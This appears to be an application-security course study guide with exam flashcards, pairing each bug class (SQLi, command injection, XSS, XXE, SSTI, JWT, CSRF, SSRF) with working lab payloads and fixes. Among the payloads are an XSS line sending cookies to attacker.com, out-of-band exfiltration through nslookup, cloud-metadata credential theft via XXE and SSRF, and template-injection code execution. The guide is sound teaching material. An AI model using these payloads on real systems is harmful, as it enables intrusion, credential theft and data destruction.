— Session 01

AppSec basics
& DVWA.

Application Security is finding and fixing bugs in software before attackers do. Every bug class you'll meet here is one mistake in different costumes: data was treated as if it were trusted code.

The CIA triad.

ConfidentialityOnly the right people can read the data.
IntegrityData hasn't been changed without permission.
AvailabilityThe service is up when users need it.

OWASP Top 10, 2021.

#CategoryOne-line meaning
A01Broken Access ControlUser accesses things they shouldn't (IDOR, admin panel)
A02Cryptographic FailuresWeak or absent encryption of sensitive data
A03InjectionSQL, command, LDAP — the interpreter is tricked
A04Insecure DesignNo threat model — flawed architecture
A05Security MisconfigurationDefault passwords, debug pages, verbose errors
A06Vulnerable ComponentsOld libraries with known CVEs
A07Auth FailuresWeak passwords, no MFA, broken sessions
A08Data Integrity FailuresInsecure deserialization, unsigned updates
A09Logging FailuresNo way to detect or respond to attacks
A10SSRFServer fetches URLs the attacker controls

DVWA — your home lab.

Damn Vulnerable Web App is a purposely-broken PHP application you run locally. The security-level slider toggles defences from Low to Impossible, so you can attack the same form at every difficulty.

  • Setup. XAMPP or Docker. Drop DVWA into htdocs/, browse http://localhost/dvwa, click Create / Reset Database.
  • Default credentials. admin / password
  • Suggested order. Brute Force → Command Injection → SQLi → File Upload → XSS → CSRF.
✓

Exam tip. If asked "what's the root cause of injection bugs?" — answer: user input is concatenated into a string passed to an interpreter (DB, shell, template engine), which cannot tell code from data.

— Session 02

Pentest phases,
Burp & nmap.

A pentest is an authorised simulation of an attack. It follows a repeatable lifecycle so findings are reproducible and the final report actually means something.

The eight phases.

#PhaseGoalLead tool
01ReconnaissanceGather public info on targettheHarvester · Amass · Shodan
02Threat ModelingDecide what to attack firstSTRIDE · MS TMT
03Scanning & EnumFind open ports, services, endpointsnmap · Gobuster · FFUF
04Vuln AnalysisFind known weaknessesNuclei · Nessus · searchsploit
05ExploitationProve the bug is realMetasploit · Burp · SQLmap
06Post-ExploitImpact: priv-esc, dump credsLinPEAS · Mimikatz
07Lateral MovePivot to other machinesCrackMapExec · Evil-WinRM
08ReportingWrite up findings + fixesMarkdown · Dradis
!

Golden rule. Never test without written authorisation (scope + Rules of Engagement). Stay in scope. Timestamp every action so you can prove what you did vs what an attacker did.

nmap — commands to memorise.

~ bash · nmap.sh 
nmap -sV -p- target               # version detect, all 65,535 ports
nmap -sC -sV target                 # default scripts + version (most common)
nmap -A target                       # aggressive: OS + scripts + traceroute
nmap -sU -p 53,161 target            # UDP — DNS and SNMP
nmap -Pn target                      # skip ping — host blocks ICMP
nmap --script vuln target            # run all vuln-check NSE scripts
nmap -oA output target                # save in all 3 formats

Burp Suite, by tool.

ToolWhat it does
ProxySits between browser and server. Intercept, modify, forward.
RepeaterEdit & re-send a single request. ⌘R sends from Proxy.
IntruderSend the same request many times with different payloads.
ComparerDiff two responses byte-by-byte.
DecoderURL · Base64 · HTML · hex.
CollaboratorCatches DNS / HTTP callbacks from blind bugs.

Intruder attack types

  • Sniper — one payload list, one position at a time.
  • Battering Ram — one payload list, same value in every position.
  • Pitchfork — two lists, run in parallel (1st of A with 1st of B).
  • Cluster Bomb — every combination of multiple lists.
— Session 03

Threat modeling.

A structured way to ask what could go wrong with a system before the broken code is written. Microsoft's four-question framework is the spine of every approach.

The four questions.

#QuestionOutput
1What are we building?Architecture diagram + trust boundaries
2What could go wrong?Threat list mapped to STRIDE
3What do we do about it?Mitigation plan, security requirements
4Did we do a good job?Updated model, lessons learned

DFD — the five symbols.

SymbolMeaningExamples
☐ RectangleExternal entity (untrusted actor)Browser, mobile app, third-party API
○ CircleProcess (your code)API server, Lambda, auth service
═══ LinesData store (at rest)PostgreSQL, S3, Redis, queue
→ ArrowData flow (in transit)HTTPS request, SQL query, message
┄┄┄ Dashed boxTrust boundaryInternet ↔ VPC, public ↔ private subnet
▸

Trust boundary rule. Every arrow crossing a dashed boundary is an attack-surface entry point. Inbound → validate input. Outbound → think about leakage.

STRIDE — the alphabet.

ThreatViolatesExampleFix
SSpoofingAuthenticationStolen session cookieMFA, signed JWTs, mTLS
TTamperingIntegritySQLi, MITM editParameterized queries, TLS, signatures
RRepudiationNon-repudiation"I didn't do it" — no logsImmutable audit logs
IInfo DisclosureConfidentialityStack trace, public S3Encrypt, custom errors, ACLs
DDenial of ServiceAvailabilityDDoS, ReDoSRate limit, autoscale, timeouts
EElevation of PrivilegeAuthorizationIDOR, forged role claimRBAC, server-side authz

DREAD — turn a threat into a number.

formula 
Risk = ( Damage + Reproducibility + Exploitability + Affected + Discoverability ) / 5

// 9–10  Critical · fix immediately
// 7–8   High     · fix this sprint
// 4–6   Medium   · next release
// 1–3   Low      · backlog

Worked example — login flow.

User → Browser → API → Auth Service → Database. Trust boundaries crossed: Internet→Server, App→DB.

  • S — Attacker uses a stolen session cookie to impersonate the user.
  • T — SQL injection in the username field bypasses authentication.
  • R — No audit log of failed login attempts.
  • I — "Username not found" vs "Wrong password" leaks account existence.
  • D — Credential stuffing locks out real users.
  • E — JWT with weak signing secret forged with admin role.
— Session 04

SQL injection.

The oldest, most preventable bug — and still on the OWASP Top 10. The cure has existed for two decades. Most apps still don't take it.

Root cause.

The app glues user input into an SQL string. The database can't tell developer-code from attacker-input.

python · vulnerable.py 
# VULNERABLE
query = "SELECT * FROM users WHERE username = '"
      + username + "' AND password = '"
      + password + "'"

# Attacker sends username = administrator'--
SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
# Everything after -- is comment. Password check is gone.

Four flavours.

TypeServer shows youTest payload
In-band (UNION)Data in response' UNION SELECT username,password FROM users--
Error-basedDB error has data' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
Boolean blindPage changes true/false' AND SUBSTRING(pass,1,1)='a'--
Time blindResponse timing only' AND SLEEP(3)--

UNION rules — exam favourite.

  1. Number of columns must match.
  2. Order of columns must match.
  3. Datatypes must be compatible.

Find the column count — add NULLs until no error:

sql · column-count 
' UNION SELECT NULL--                  // error
' UNION SELECT NULL, NULL--            // error
' UNION SELECT NULL, NULL, NULL--      // 200 OK ← 3 columns

The real fix.

python · safe.py 
# SAFE — parameterized query
cursor.execute(
  "SELECT * FROM users WHERE username = %s AND password = %s",
  (username, password)
)
✓

Query structure compiled first, user data passed separately. Even if the user types admin'--, the quote is treated as a literal character — not SQL syntax.

PortSwigger labs — class answers.

ApprenticeSQLi in WHERE clause — retrieve hidden data

Inject into the category parameter to bypass the released-flag check:

payload
?category=Gifts'+OR+1=1--

Resulting WHERE: category='Gifts' OR 1=1 --' AND released=1. The -- comments out the released check; OR 1=1 returns every row — including unreleased products.

ApprenticeSQLi allowing login bypass

Username: administrator'--. Password: anything. The -- kills the password check entirely.

PractitionerUNION attack — determine column count

Add NULLs one at a time until you get HTTP 200 with no error. Lab has 3 columns:

payload
?category=Gifts'+UNION SELECT+NULL,NULL,NULL--
PractitionerUNION — retrieving data from other tables
payload
'+UNION SELECT+username,password+FROM+users--

Read administrator's password from the response, then log in.

GradedSQLi with filter bypass via XML encoding

A WAF blocks the keyword SELECT. The stock-check sends XML — entity encoding is decoded by the parser before reaching the WAF.

xml · stock-check.xml
<stockCheck>
  <productId>1</productId>
  <storeId>1 UNION &#x53;ELECT username || '~' || password FROM users</storeId>
</stockCheck>

&#x53; = S. Use Burp's Hackvertor extension for fast encoding.

GradedBlind SQLi with conditional responses

TrackingId cookie. Test for the "Welcome back" string:

probe
TrackingId=xyz' AND '1'='1'      // "Welcome back" appears
TrackingId=xyz' AND '1'='2'      // no "Welcome back"

Extract the password char-by-char:

extract
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Burp Intruder → Cluster Bomb: position 1 = char index (1..20), position 2 = char (a-z 0-9). Grep for "Welcome back". Assemble the password.

— Session 05

OS command
injection.

SQLi gives you the database. Command injection gives you the box. Same root cause — the interpreter is the OS shell instead of the database.

python · vulnerable.py 
# VULNERABLE
os.system("ping -c 1 " + hostname)
# Attacker sends:  8.8.8.8; whoami
# Shell sees:      ping -c 1 8.8.8.8; whoami

Shell metacharacters.

CharNameBehaviour
;SemicolonRun cmd2 always — most reliable.
|Pipecmd1's stdout → cmd2
&&Logical ANDcmd2 only if cmd1 succeeds
||Logical ORcmd2 only if cmd1 fails
$()SubshellInline substitution: echo $(whoami)
&Backgroundcmd1 in bg, cmd2 starts immediately
%0aURL newlineBypasses filters that only block ; and |

Three scenarios.

  • In-band — output visible → ; cat /etc/passwd
  • Time blind — no output, only delay → ; sleep 5
  • OOB blind — no output, no time → Burp Collaborator → ; nslookup x.BURPCOLLAB

PortSwigger labs — class answers.

ApprenticeOS command injection — simple case

Stock-check POST body. Inject into storeID:

payload
productID=1&storeID=1|whoami

Response includes the runtime user (peter-XXXX).

PractitionerBlind — time delay

Feedback form, email field:

payload
email=x||ping+-c+10+127.0.0.1||

Response takes ~10s → confirmed.

PractitionerBlind — output redirection

Web root for served images is /var/www/images/:

payload
email=x||whoami>/var/www/images/out.txt||

Then GET /image?filename=out.txt returns the output.

PractitionerBlind — out-of-band callback
payload
email=x||nslookup+x.BURPCOLLAB||

Burp Collaborator → Poll now → DNS hit confirms execution.

GradedBlind — OOB data exfiltration

Embed whoami output as the subdomain:

payload
email=x||nslookup+`whoami`.BURPCOLLAB||

Collaborator shows peter-abc.<collab> — submit peter-abc as the answer.

DefenceThe fix — parameterized API

Never call a shell with user input. List-form APIs pass args directly via execve() — no shell parses metacharacters.

python · safe.py
# SAFE — shell=False is default in Python
subprocess.run(["ping", "-c", "1", hostname], shell=False)

With list form, 8.8.8.8; whoami is a literal hostname. ping just says "unknown host". No shell = no metacharacter power.

— Session 06

XSS &
clickjacking.

You make someone else's browser run your JavaScript on the vulnerable site — with their cookies and their permissions.

Three flavours.

TypeWhere payload livesTrigger
ReflectedIn the URL / parameterVictim clicks the attacker's link
StoredSaved in DB — comment, profileVictim visits the normal page
DOM-basedNever reaches server — client JSOften location.hash / document.URL

DOM XSS — source meets sink.

Sources: location.hash, location.search, document.URL, window.name, localStorage.

Sinks: innerHTML, document.write, eval, element.src, jQuery $().

▸

Rule. Source → sink without sanitisation = DOM XSS.

Canonical cookie steal.

html · payload 
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

HttpOnly cookies block this exact attack. Most apps still leak CSRF tokens, API keys, or non-HttpOnly tokens this way.

PortSwigger labs — class answers.

ApprenticeReflected XSS into HTML, nothing encoded
payload
?search=<script>alert(1)</script>
ApprenticeStored XSS into HTML context

Post a comment containing:

comment
<script>alert(1)</script>
ApprenticeDOM XSS in document.write via search
payload
?search=x"><svg onload=alert(1)>
PractitionerReflected into attribute, brackets encoded

Break out of the attribute, add an event handler:

payload
" autofocus onfocus=alert(1) x="
PractitionerExploit XSS to perform CSRF

Read the CSRF token from /my-account, then POST the change-email form with the stolen token — all inside a stored XSS payload.

js · csrf-via-xss.js
<script>
var x = new XMLHttpRequest();
x.open('GET', '/my-account');
x.onload = () => {
  var t = /name="csrf" value="([^"]+)/.exec(x.responseText)[1];
  var c = new XMLHttpRequest();
  c.open('POST', '/my-account/change-email');
  c.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  c.send('email=evil@a.com&csrf=' + t);
};
x.send();
</script>
PractitionerClickjacking — basic with CSRF token

Host an HTML page that iframes /my-account with opacity: 0.0001, then overlay a decoy "Click for prize" button exactly over "Delete account". Defence: X-Frame-Options: DENY or CSP frame-ancestors 'none'.

— Session 07

XXE & SSTI.

The XML parser was designed to be helpful. External entities let it pull in any URL or file the server can reach — exactly the foothold an attacker wants.

XXE — anatomy of a payload.

<!DOCTYPE> is the rules block. <!ENTITY name "value"> is a variable. With SYSTEM, the variable loads from external. &name; in the body inserts the value.

xml · xxe-file-read.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
ApprenticeXXE to retrieve files

Use the payload above. /etc/passwd contents appear in the error/response.

ApprenticeXXE to perform SSRF
xml · ssrf
<!ENTITY xxe SYSTEM
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">

AWS metadata is returned to you — IAM credentials leak.

PractitionerBlind XXE — out-of-band
xml · blind-oob
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>

Collaborator receives a DNS/HTTP hit → confirms blind XXE.

DefenceThe fix — disable external entities

Java: setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false). PHP: libxml_disable_entity_loader(true). Python: use defusedxml instead of the stdlib parser.

SSTI — server-side template injection.

App embeds user input directly into a server template. Engine evaluates it as code. Detect with math:

probe · engine-fingerprint 
${7*7}     // Freemarker, Velocity
{{7*7}}     // Jinja2, Twig
<%= 7*7 %>  // ERB (Ruby)
#{7*7}     // Pug, Expression Language
*{7*7}     // Thymeleaf

If the response renders 49, you have SSTI in that engine.

Class methodology — three steps

  1. Look for reflection of user input.
  2. Enumerate the engine by which math syntax evaluates.
  3. Find the payload that maps to that engine's RCE primitive.
ApprenticeSSTI Lab 1 — basic ERB
erb · payload
<%= system("rm /home/carlos/morale.txt") %>
PractitionerTwig (PHP) — RCE
twig · rce
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
PractitionerJinja2 (Python) — RCE
jinja2 · rce
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
— Session 08

Authentication
& JWT.

Authentication answers "who are you?". Get it wrong and every other control is moot. JWTs make auth stateless — and introduce a fresh family of bugs because the token, not the server, carries the trust.

Session vs token.

Server sessionJWT token
StateStateful — session stored server-side, cookie holds Session IDStateless — nothing stored server-side
StorageServerClient
RevocationEasyHard — token is valid until it expires

Authentication bugs → fix.

WeaknessMitigation
Credentials over plain HTTPHTTPS only; transmit via POST, never in the URL
No limit on login attempts (brute force / credential stuffing)Rate-limit, lockout/backoff, CAPTCHA after N fails
Weak credential storage (plaintext, MD5)Hash + salt with bcrypt / Argon2 / PBKDF2
Verbose errors → username enumerationIdentical generic error for every failure
Session fixation (attacker-set session ID)Regenerate the session ID on login
Default credentialsForce change on first use; remove defaults

JWT — Header.Payload.Signature.

jwt · anatomy
# 1 · Header  — metadata, Base64
{ "alg":"HS256", "typ":"JWT" }
# 2 · Payload — claims, Base64 (anyone can decode!)
{ "sub":"123", "role":"admin", "exp":1735689600 }
# 3 · Signature = HMAC( base64(header)+"."+base64(payload), SECRET )
#     -> proves integrity / that the token wasn't modified

Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.abc123

Claims: iss issuer · sub subject · aud audience · exp expiry · iat issued-at · nbf not-before.

JWT attacks → fix.

AttackHowFix
1alg:none bypassSet "alg":"none", strip the signature — server trusts itWhitelist algorithms; reject none
2Weak secretGuessable HS256 key cracked offline (Hashcat / John)256-bit random secret
3Alg confusionSwitch RS256→HS256, sign with the public key as HMAC secretPin one expected algorithm
4kid / jku / jwk injectionPoint key-id to a path/SQLi or supply attacker keySanitise kid; ignore client keys; allow-list jku
5No exp checkExpired tokens stay valid — session never diesAlways validate exp, nbf, iat
6Privilege escalationChange "role":"user"→"admin" when sig unverifiedVerify signature + validate all claims
!

Exam tip. A JWT is encoded, not encrypted. Header and payload are plain Base64 — anyone can read them. What protects a JWT is its signature, not secrecy. Never put passwords, keys or secrets in the payload.

— Session 09

Authorization
& cryptography.

Authorization answers "what are you allowed to do?" — and must be enforced server-side on every request. Broken Access Control is OWASP #1. Cryptography is the toolkit that protects the data once you've decided who may touch it.

IDOR — missing ownership check.

An app exposes an object id and forgets to verify the requester owns it.

python · idor
# /invoice?id=1001  ->  attacker tries id=1002  (200 OK)
# VULNERABLE — checks existence, not ownership
invoice = Invoice.get(id)
return invoice

# SECURE — verify ownership
if invoice.owner != current_user:
    deny_access()

Privilege escalation.

TypeMeaningExample
VerticalGain a higher roleNormal user reaches /admin/deleteUser → should be 403
HorizontalReach a same-level user's dataRead another customer's invoice / profile

Authorization test checklist: change IDs · change roles · hit admin URLs (forced browsing) · access other users' resources · tamper API requests · probe hidden functionality.

Encoding ≠ encryption ≠ hashing.

ConceptPurposeReversible?
Encoding (Base64)Representation / transportYes, trivially
Encryption (AES, RSA)ConfidentialityYes, with the key
Hashing (bcrypt, SHA-256)Integrity / password storageNo — one-way
  • Symmetric (AES) — same key encrypts and decrypts. Asymmetric (RSA) — public encrypts, private decrypts.
  • Digital signature — sign with private key, verify with public → integrity + authenticity + non-repudiation. Used in HTTPS, certs, JWT RS256.
  • Password storage: never plaintext or Base64. Use bcrypt / Argon2 / PBKDF2 — slow and salted (salt defeats rainbow tables).
  • Avoid: MD5 and SHA-1 (broken), ECB mode, hardcoded keys.
✓

Exam tip. Base64 is not encryption. Authentication = proving Alice is Alice; authorization = deciding whether Alice may open the admin panel. Broken Access Control = a missing authorization check.

— Session 10

Cross-site
request forgery.

CSRF makes an authenticated victim's browser fire a state-changing request they never intended. The browser auto-attaches the session cookie, so the server thinks it's genuine.

Three conditions to exploit.

Relevant actionSomething worth forging — change email/password, transfer money.
Cookie-based sessionSession identified only by a cookie the browser sends automatically.
No unpredictable parameterNo anti-CSRF token the attacker can't guess.

Proof of concept — auto-submitting form.

html · csrf-poc
<form action="https://bank.com/email/change/" method="POST"
      target="csrf-iframe" id="csrf-form">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<iframe style="display:none" name="csrf-iframe"></iframe>
<script>document.getElementById("csrf-form").submit()</script>

Victim (logged into bank.com) opens the attacker page → the hidden form auto-submits with the victim's session cookie → email changed. They only ever see "Hello World".

Defenses.

  • Anti-CSRF token — unpredictable, per-session, validated before the action. If absent, reject the request.
  • SameSite cookies — Strict or Lax stop cross-site sends.
  • Check Origin / Referer; require a custom header attacker JS can't set; re-authenticate sensitive actions.
!

Exam tip. Never use GET for state-changing actions. Tokens must not ride in the URL or in cookies, and must be validated regardless of method or content-type. If switching POST→GET still works, it's vulnerable.

— Session 11

SSRF, logic
& race conditions.

Three bugs that share one theme: the server trusts something it shouldn't — a URL, a workflow assumption, or the order of two requests.

SSRF — make the server fetch for you.

The attacker can't reach internal services — but the server can. Supply a URL and the server requests it.

ssrf · targets
{ "url":"http://127.0.0.1:8080/admin" }   # internal admin panel
{ "url":"http://169.254.169.254/latest/meta-data/" }  # cloud metadata -> IAM creds

Mitigation: allow-list URLs · block internal ranges (127.0.0.1, 10/8, 172.16/12, 192.168/16) · network segmentation · disable unnecessary outbound requests.

Business logic flaws.

BugExample
Negative quantity"quantity":-10 → negative total
Price manipulation"price":1000 → "price":1
Coupon abuseRe-apply WELCOME50 until 100% off
Workflow bypassSkip the payment step, hit order-confirmation directly

Race conditions (TOCTOU).

Two requests run at once and both pass a check that should only allow one. Balance $100, fire two $100 purchases in parallel → both succeed. Same trick double-spends coupons, gift cards, withdrawals.

▸

Trigger & fix. Fire parallel requests with Burp Turbo Intruder. Fix with atomic transactions / database locks — "check balance + deduct" must be one indivisible operation. Memorise the cloud metadata IP 169.254.169.254.

— Session 12

Open redirect.

The app redirects to a URL it took from user input without checking the destination. Small bug, big lever — it powers convincing phishing and OAuth token theft.

Where it lives.

After login, logout, password reset, OAuth, checkout. Watch these params: next · return · redirect · url · goto · continue · callback · redirect_uri.

flask · vulnerable
@app.route("/redirect")
def r():
    url = request.args.get("url")
    return redirect(url)   # no validation — user controls destination

Attack vectors.

  • Phishing. company.com/redirect?url=evil.com — the trusted domain bounces the victim to a fake login.
  • OAuth token theft. Tamper redirect_uri so the access token lands on the attacker's host.
  • Filter bypass. A check that blocks https://evil.com may allow //evil.com, ////evil.com, or https://evil.com\@trusted.com.
✓

Prevention. Allow-list trusted destinations; prefer relative paths (/dashboard) only; never redirect to a raw user-controlled URL. A 302 to your own host confirms the bug.

— Session 13

API security.

Modern apps are API-driven — the website is just UI, the API is the real functionality. Most API bugs share one root cause: the server trusts client-supplied parameters without authorising them.

Recon.

  • Find endpoints in JS (fetch("/api/...")), DevTools Network, Swagger/OpenAPI docs, mobile apps.
  • Send OPTIONS to reveal allowed methods; note content-types (JSON/XML/multipart → different parsers, different bugs).
  • Tools: Burp Proxy to capture, Intruder to fuzz, Param Miner for hidden params like isAdmin/debug.

— Session 14

Cloud, containers
& architecture.

Renting compute instead of owning it shifts where the bugs live. The provider secures the cloud; you secure what's in it — and most breaches are misconfiguration, not zero-days.

Shared responsibility.

ModelYou manageExample
IaaSOS, runtime, apps, dataEC2, Azure VM
PaaSApp code + data onlyApp Service, App Engine
SaaSData & access onlyOffice 365, Gmail

Common cloud misconfigurations.

  • Public S3 bucket set Public not Private → data leak.
  • Over-broad IAM (AdministratorAccess for everyone) → fix with least privilege.
  • Hardcoded keys committed to Git → rotate + use a secrets manager.
  • Metadata + SSRF → http://169.254.169.254/ leaks IAM credentials.

Container security.

MistakeFix

Architecture principles. Defense in depth · least privilege · network segmentation (no flat network) · zero trust — verify every request even from inside. Exam kill-chain: SSRF → 169.254.169.254 → steal IAM creds → pivot.

— Session 15

Secure code review
& DevSecOps.

Find the bug in the source, before it ships. Earlier is cheaper — a finding at commit time costs a fraction of one in production. DevSecOps bakes that check into the pipeline.

The method — source to sink.

  1. Entry points (sources) — forms, APIs, cookies, headers.
  2. Dangerous operations (sinks) — DB queries, OS commands, file access, HTML render.
  3. Trace the data flow source → sink.
  4. Verify validation / encoding exists on the path.

Grep for sinks: eval() · exec() · system() · innerHTML · document.write · SQL string concatenation · verify=False. Grep for secrets: password= · apikey= · secret= · token=.

assignment.

Two deliverables: a DFD Level 1 on pen and paper, and an Excel STRIDE table. What follows is what the marker is actually looking for.

Part 1 — the DFD.

Use the five standard symbols. Label every element. Draw trust boundaries around zones of equal trust: Internet ↔ VPC, public ↔ private subnet, app ↔ database tier.

Part 2 — the STRIDE table.

For each component on your DFD, write at least two threats. Each row needs all six columns:

— Recall practice

The exam,
in flashcards.

Click any card to reveal the answer. If you remember nothing else, remember these.

What's the root cause of all injection bugs?

User input is concatenated into a string passed to an interpreter (DB, shell, template engine, XML parser). The interpreter can't separate code from data. Fix: parameterised API.

How do you find the column count for a UNION attack?

Pad with NULLs, or use ORDER BY n — increment n until the query errors. The last n that succeeded is the column count.

What does -- do in a SQLi payload?

Starts a SQL comment — everything after it on the line is ignored. Used to strip the rest of the original query so the injection isn't broken by what follows.

Why is subprocess.run([...], shell=False) safe but os.system("ping " + host) isn't?

List form passes args straight to the OS via execve() — no shell ever sees the metacharacters. os.system invokes a shell that interprets ; and | as separators.

STRIDE in 30 seconds?

Spoofing · Tampering · Repudiation · Info disclosure · DoS · Elevation of privilege — one per security property: Auth · Integrity · Non-repudiation · Confidentiality · Availability · Authorization.

DREAD formula?

Risk = (Damage + Reproducibility + Exploitability + Affected users + Discoverability) ÷ 5. Score each 1–10. 9–10 = critical.

DFD levels — which one for threat modeling?

Level 1: main processes, data stores, trust boundaries. Detailed enough to find threats, abstract enough to stay manageable. Level 0 is for execs; Level 2/3 are deep dives.

Attack surface vs attack vector?

Surface = the entry points that exist. Vector = the specific path or technique used through one. Login form = surface. SQLi in the username field = vector.

Reflected vs stored vs DOM XSS?

Reflected: payload in URL, server reflects in response. Stored: payload saved server-side, triggers on every view. DOM: payload never sent to server — handled by client-side JS source → sink.

Why is HttpOnly important?

JavaScript can't read document.cookie for cookies marked HttpOnly. It defeats the basic fetch('attacker?c='+document.cookie) XSS exfil pattern.

What does &xxe; do in an XXE payload?

It's a reference to the entity declared in <!ENTITY xxe SYSTEM "file:///etc/passwd">. When the parser sees &xxe; in the XML body it substitutes the loaded file contents.

How do you confirm a blind bug?

Time delay (sleep) or an out-of-band callback (Burp Collaborator DNS / HTTP). Use Collaborator when time delays are unreliable or filtered.

SAST vs DAST?

SAST reads source code statically — Semgrep, Bandit, CodeQL. DAST tests the running app — Burp, OWASP ZAP, Nuclei.

X-Frame-Options vs CSP frame-ancestors?

Both stop clickjacking. CSP frame-ancestors is the modern replacement and supports multiple sources. Prefer it.
